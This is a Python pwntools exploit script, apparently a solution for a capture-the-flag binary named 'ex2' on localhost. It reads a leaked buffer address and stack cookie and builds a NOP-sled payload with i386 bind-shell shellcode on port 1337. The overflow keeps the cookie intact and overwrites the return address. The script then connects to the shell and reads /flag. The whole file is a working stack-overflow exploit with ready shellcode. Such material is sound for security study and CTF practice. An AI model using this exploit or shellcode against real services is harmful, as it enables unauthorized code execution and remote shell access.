#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./ex2"

rhp = {'host':"localhost",'port':31338}
context(os='linux',arch='i386')
binf = ELF(FILENAME)

#shell bind tcp to 1337
shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

def exploit(conn):
  #leak buf_addr and secret(cookie)
  data = conn.recv(8)
  buf_addr = unpack(data[0:4])
  secret = unpack(data[4:8])
  print("buf_addr   :"+hex(buf_addr))
  print("secret     :"+hex(secret))

  #generate payload
  payload = p8(0x90) * 0x20
  payload += shellcode
  payload += p8(0x90) * (0x800 - len(payload))
  payload += p32(secret)
  payload += p8(0x90) * 0xc
  payload += p32(buf_addr)

  #run
  conn.sendline(payload)

  #connect to 1337 and get a flag
  shell = remote("127.0.0.1",1337)
  shell.sendline("cat /flag")
  print(shell.recvline())

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()

